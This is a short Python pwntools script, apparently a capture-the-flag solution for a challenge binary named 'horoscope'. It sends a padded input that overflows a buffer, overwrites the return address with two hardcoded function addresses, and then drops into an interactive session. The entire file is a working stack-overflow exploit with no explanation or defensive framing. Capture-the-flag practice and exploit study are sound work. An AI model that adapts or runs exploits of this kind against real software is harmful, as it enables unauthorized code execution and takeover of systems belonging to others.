from pwn import *

if __name__ == '__main__':
    io = process('./horoscope')
    # io = remote('horoscope.sdc.tf', 1337)
    io.recvuntil(b'very own horoscope\n')
    print(cyclic_find(b'aaoa'))
    DEBUG_FUNC_ADDR = 0x0040096e
    TEST_FUNC_ADDR = 0x00400950
    io.sendline(b'1/' +
                b'A' * cyclic_find(b'aaoa') +
                p64(DEBUG_FUNC_ADDR) +
                p64(TEST_FUNC_ADDR))
    io.interactive()
